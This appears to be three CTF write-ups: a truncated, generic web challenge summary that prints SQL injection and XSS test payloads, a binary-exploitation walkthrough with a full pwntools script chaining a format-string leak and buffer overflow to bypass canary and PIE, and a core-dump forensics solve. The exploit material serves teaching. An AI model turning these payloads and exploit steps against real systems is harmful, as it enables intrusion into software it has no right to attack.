# I-DO: The Veiled Vow

## Summary
The I-DO: The Veiled Vow challenge involved a web application where users were required to perform various tasks to retrieve sensitive information securely kept on the server. The writeup details the [...]  

## Steps

1. **Analysis of Application**  
   The first step was to analyze the application's functionality, observing how it processed user inputs and managed sessions. This involved intercepting requests using tools like Burp Suite to read[...]  

2. **Identifying Vulnerabilities**  
   During the analysis phase, common vulnerabilities such as Cross-Site Scripting (XSS), SQL Injection, and session fixation were considered. The application's response to unexpected inputs was note[...]  

3. **Probing for Exploits**  
   Various payloads were tested in form fields and HTTP headers to check for vulnerabilities. The use of automated scanners was also considered to speed up the process.  
   
   ```python
   # Example of a SQL injection payload
   ' OR '1'='1' -- 
   ```

4. **Gaining Access**  
   After confirming a vulnerability, the next step involved crafting requests to gain access to protected resources or functionalities within the application.

5. **Retrieving Sensitive Information**  
   After successfully exploiting the vulnerability, sensitive information was retrieved from the application. This information was carefully analyzed and documented, noting the security measures that [...]  

6. **Conclusion**  
   The final step of the writeup includes conclusions drawn from the challenge. Recommendations on fortifying the application against identified vulnerabilities were provided, highlighting best practi[...]  

## Code Examples
- **JavaScript code for XSS exploitation:**  
   ```javascript
   <script>alert('Exploited!');</script>
   ```

- **Python code for sending HTTP requests:**  
   ```python
   import requests
   response = requests.get('http://example.com/vulnerable_endpoint')
   print(response.text)
   ```

---

# Black Flash — Binary Exploitation Writeup

**CTF:** UMCybersec CTF  
**Category:** Binary Exploitation (Pwn)   
**Challenge:** Black Flash  

## Overview

> *Mei Mei has been lured into the Smallpox Deity's Domain Expansion! She is currently sealed inside a heavy stone coffin, and the countdown to her burial has begun. Help Mei Mei perform a Black Flash to shatter the coffin and reach the core of the curse before she's buried for good.*

We're given three files:
- `black_flash` — the vulnerable binary
- `libc.so.6` — the provided libc
- `ld-linux-x86-64.so.2` — the provided dynamic linker

## Initial Analysis

First thing I did was run `file` and check the binary:

```bash
file black_flash
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Then I checked what symbols are in the binary:

```bash
nm black_flash | grep -v ' U '
```

Immediately spotted a `win` function at offset `0x1261`. That's a good sign — this is a ret2win challenge.

**Protections:**
- PIE enabled (addresses randomized)
- Stack canary enabled
- NX enabled
- Full RELRO

So even though there's a `win()` function, we can't just jump to it directly because PIE randomizes the base address every run, and the stack canary will kill the process if we overflow without fixing it.

## Reversing the Binary

I disassembled the key functions with `objdump`:

```bash
objdump -d -M intel black_flash
```

### `win()` — the target

`win()` opens `flag.txt`, reads it, and prints it:

```
fopen("flag.txt", "r")  →  fgets(buf, 0x80)  →  printf("Flag: %s", buf)
```

### `vuln()` — where the bugs live

This function has **two separate vulnerabilities**:

```
1. printf("Where is the feeling......: ")
2. fgets(buf[rbp-0x80], 0x70, stdin)   ← input 1 (safe size)
3. printf(buf)                          ← BUG 1: format string vulnerability!
4. printf("Now, you reach the core of the spark......: ")
5. fgets(buf[rbp-0x80], 0x100, stdin)  ← BUG 2: buffer overflow! (0x100 into 0x80 buf)
```

So the plan became clear:
1. Use the **format string** to leak the stack canary and a PIE pointer
2. Use the **buffer overflow** to overwrite the return address and redirect execution to `win()`

## Exploitation

### Step 1 — Format String Leak

The stack layout in `vuln()` looks like this:

```
rbp-0x80   ←  buf (our input / the format string)
...
rbp-0x08   ←  stack canary
rbp+0x00   ←  saved rbp
rbp+0x08   ←  saved rip  (return address back into main)
```

In x86-64, the first 5 format string arguments after `%1$` go into registers, and then `%6$` starts reading from the stack. Since `buf` sits at `rsp` (= `rbp-0x80`), counting up:

- `%6$` = buf[0] (start of our input)
- `%21$` = rbp-0x08 = **stack canary**
- `%23$` = rbp+0x08 = **saved rip** (points into `main`, leaks PIE base)

So sending `%21$p.%23$p` as the first input gives us both values in one shot.

From the leaked saved rip, I calculated the PIE base:
```python
# saved_rip points to instruction after "call vuln" in main, which is main+0x35
# that instruction is at PIE_base + 0x1548
pie_base = saved_rip - 0x1548
win_addr = pie_base + 0x1261
```

### Step 2 — Buffer Overflow

The second `fgets` reads `0x100` bytes into a buffer that's only `0x80` bytes — a clean 128-byte overflow.

With the canary and PIE base known, I crafted the payload:

```
[0x78 bytes padding] [canary] [fake rbp] [ret gadget] [win()]
```

The extra `ret` gadget at `PIE+0x1016` is needed for **stack alignment** — glibc's `fopen` uses `movaps` which requires the stack to be 16-byte aligned before the call, otherwise it'll segfault.

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

elf  = ELF('./black_flash', checksec=False)
context.binary = elf
context.log_level = 'info'

HOST = 'chal.umcybersec.site'
PORT = 10070

WIN_OFF = 0x1261
RET_OFF = 0x1016   # ret gadget for stack alignment

def exploit(io):
    # Step 1: format string leak
    io.recvuntil(b'Where is the feeling......: ')
    io.sendline(b'%21$p.%23$p')

    io.recvuntil(b'Is this the feeling you want......: ')

    # recvuntil the full next prompt so we don't consume it accidentally
    leak_line = io.recvuntil(b'Now, you reach the core of the spark......: ')
    leak_part = leak_line.split(b'\n')[0].strip()

    parts     = leak_part.split(b'.')
    canary    = int(parts[0], 16)
    saved_rip = int(parts[1], 16)

    pie_base = saved_rip - 0x1548
    win_addr = pie_base + WIN_OFF
    ret_addr = pie_base + RET_OFF

    log.success(f'Canary  : {hex(canary)}')
    log.success(f'PIE base: {hex(pie_base)}')
    log.success(f'win()   : {hex(win_addr)}')

    # Step 2: buffer overflow → ret2win
    payload  = b'A' * 0x78           # padding to canary
    payload += p64(canary)            # restore canary (bypass stack check)
    payload += p64(0xdeadbeefcafe)   # fake saved rbp
    payload += p64(ret_addr)          # alignment gadget
    payload += p64(win_addr)          # redirect to win()

    io.send(payload + b'\n')

    # Step 3: collect flag
    io.recvuntil(b'Is there any spark here: ')
    flag = io.recv(256, timeout=5)
    log.success(f'\n{flag.decode(errors="replace")}')

io = remote(HOST, PORT)
exploit(io)
io.close()
```

## Running It

```bash
python3 exploit.py
```

Output:
```
[+] Opening connection to chal.umcybersec.site on port 10070: Done
[+] Canary  : 0x926367adfb954600
[+] PIE base: 0x56bfb0ddb000
[+] win()   : 0x56bfb0ddc261

U got the feeling! Black Flash!!!!?
Flag: UMCS{...}
```

## Summary

| Step | Technique | Purpose |
|------|-----------|---------|
| 1 | Format string (`%21$p.%23$p`) | Leak canary + PIE base |
| 2 | Buffer overflow (second `fgets`) | Overwrite return address |
| 3 | ret gadget for alignment | Fix stack before `fopen` in `win()` |
| 4 | ret2win | Jump to `win()` which prints the flag |

The key insight is that the challenge gives you **two separate inputs** — the first is vulnerable to a format string read, and the second is a classic buffer overflow. Chaining them together lets you bypass both PIE and the stack canary to get code execution.

---

# The Winning Shot — CTF Forensics Writeup

**CTF:** UMCS CTF  
**Category:** Forensics    
**Flag:** `UMCS{k1n3t1c_3n3rgy_r3c0v3r3d_fr0m_c0r3_dump}`

## Overview

> "The break shot has been taken, and the balls are scattered across the memory space. We managed to freeze the table mid-game, but the suspect's final move remains hidden in the pocket."

This challenge gave us a zip file (`8_b411_p00l_1s_7un.zip`) and told us a Linux environment is recommended. The hint to `chmod +x winning_shot` already hinted that we'd be dealing with an ELF binary. Let's dig in.

## Recon — What's in the zip?

```bash
unzip 8_b411_p00l_1s_7un.zip
file pool winning_shot core.170390
```

```
pool:         JPEG image data, JFIF standard 1.01, ...
winning_shot: ELF 64-bit LSB pie executable, x86-64, ... not stripped
core.170390:  ELF 64-bit LSB core file, x86-64, ... from './winning_shot'
```

Three files:
- `pool` — a JPEG image (rabbit hole, but fits the theme)
- `winning_shot` — the main ELF binary
- `core.170390` — a **core dump** of `winning_shot` mid-execution

The "frozen table mid-game" from the description = the core dump. The process was caught while sleeping in memory. Classic forensics setup.

## Step 1 — Strings on the Binary

First thing I always do: run `strings` and see if anything jumps out.

```bash
strings winning_shot | grep -E "UMCS|k1n|3t1c|dump"
```

```
UMCS{k1nH
3t1c_3n3H
rgy_r3c0H
v3r3d_frH
fr0m_c0rH
3_dump}
```

The flag is clearly in the binary but it's fragmented — each chunk ends with `H` which is just garbage from how the bytes spill over 8-byte boundaries. It's not the real flag yet, just a hint that the data is stored as hardcoded `movabs` (64-bit immediate move) instructions on the stack.

Also spotted `CUE_BALL_STATE_V1` — this is clearly a custom struct marker that'll be important later.

## Step 2 — Disassembly of `main`

```bash
objdump -d winning_shot | grep -A 200 "<main>"
```

Reading through the disassembly, here's what the binary actually does:

1. **`malloc(0x3c)`** — allocates 60 bytes (the "key buffer")
2. **Opens `/dev/urandom`** and reads 60 random bytes into the buffer
3. **Loop (i = 0 to 14):** sets `key_buffer[i*4] = i+1` — this overwrites the first byte of each 4-byte group with the ball number (1 to 15). So each "ball" = `[ball_num, rand_byte, rand_byte, rand_byte]`
4. **Hardcoded flag** is stored on the stack via a series of `movabs` instructions
5. **XOR loop:** `encrypted[i] = flag[i] XOR key[i % 60]`
6. Writes the result to a file called `WINSHOT`
7. Prints its PID and **sleeps forever** — that's why we have a core dump!

The key thing I noticed in the disasm was the `movabs` offsets:

```
mov %rax,-0x60(%rbp)   ; offset 0
mov %rdx,-0x58(%rbp)   ; offset 8
mov %rax,-0x50(%rbp)   ; offset 16
mov %rdx,-0x48(%rbp)   ; offset 24
mov %rax,-0x42(%rbp)   ; offset 30  <-- NOT -0x40! overlapping write
mov %rdx,-0x3a(%rbp)   ; offset 38
```

That `-0x42` instead of `-0x40` is intentional — the writes **overlap** to pack the string tightly. If you naively decode all 6 QWORDs without accounting for this, you get `frfr0m` instead of `fr0m`. Tricky.

## Step 3 — Extracting the Key from the Core Dump

Since the key is random (from `/dev/urandom`), we can't reconstruct it from the binary alone. But the process was frozen mid-sleep — so the key is still alive in heap memory inside the core dump.

I used `pyelftools` to parse the core dump segments:

```python
from elftools.elf.elffile import ELFFile

with open('core.170390','rb') as f:
    elf = ELFFile(f)
    for seg in elf.iter_segments():
        print(seg.header.p_type, hex(seg.header.p_vaddr), hex(seg.header.p_filesz))
```

The heap segment was at VAddr `0x55c5b9db0000`, file offset `0x33f8`, size `0x21000`.

Searching for our marker:

```python
data = open('core.170390','rb').read()
heap = data[0x33f8:]
idx = heap.find(b'CUE_BALL_STATE_V1')
# Found at heap+752
```

Dumping the bytes after the marker:

```
offset 32: 01 f5 be 62   <- Ball 1:  rand=0xf5, 0xbe, 0x62
offset 36: 02 e4 70 5f   <- Ball 2:  rand=0xe4, 0x70, 0x5f
offset 40: 03 a5 1a 93   <- Ball 3:  ...
...
offset 88: 0f 29 e5 8a   <- Ball 15: rand=0x29, 0xe5, 0x8a
```

All 15 balls (60 bytes) recovered. This is our XOR key.

## Step 4 — Recovering the Flag

At this point I realised the flag was **already plaintext in the binary** — the XOR is applied to produce the `WINSHOT` output file, but the original flag string is hardcoded before encryption. So I just needed to correctly decode the stack layout:

```python
import struct

flag_raw = bytearray(48)

def write_q(buf, offset, val):
    b = struct.pack('<Q', val)
    for i, x in enumerate(b):
        buf[offset+i] = x

write_q(flag_raw, 0,  0x6e316b7b53434d55)
write_q(flag_raw, 8,  0x336e335f63317433)
write_q(flag_raw, 16, 0x306333725f796772)
write_q(flag_raw, 24, 0x72665f6433723376)
write_q(flag_raw, 30, 0x7230635f6d307266)  # -0x42 offset = overlap at 30
write_q(flag_raw, 38, 0x7d706d75645f33)    # -0x3a offset = 38

flag = flag_raw.rstrip(b'\x00').decode()
print(flag)
```

Output:
```
UMCS{k1n3t1c_3n3rgy_r3c0v3r3d_fr0m_c0r3_dump}
```

## Flag

```
UMCS{k1n3t1c_3n3rgy_r3c0v3r3d_fr0m_c0r3_dump}
```

## Summary

| Step | What I did |
|---|---|
| Unzip + `file` | Identified binary, JPEG, and a **core dump** |
| `strings` | Found fragmented flag chunks hinting at `movabs` storage |
| `objdump -d` | Reversed the XOR encryption logic and stack layout |
| Parse core dump | Located the heap segment, found `CUE_BALL_STATE_V1` marker |
| Dump key | Extracted all 15 "ball" key entries (60 bytes of XOR key) |
| Decode flag | Accounted for **overlapping `movabs` offsets** to get the correct string |

The trickiest part was realising the `movabs` at `-0x42(%rbp)` was NOT at `-0x40` — that 2-byte offset shift causes an overlap that corrupts the flag if you don't account for it. Once I mapped the stack offsets correctly, the flag fell out cleanly.

The pool/billiards theme was a cute touch — 15 balls = 15 key entries, the "pocket" = the encrypted output file, the "core dump" = the frozen table. 10/10 flavour text.
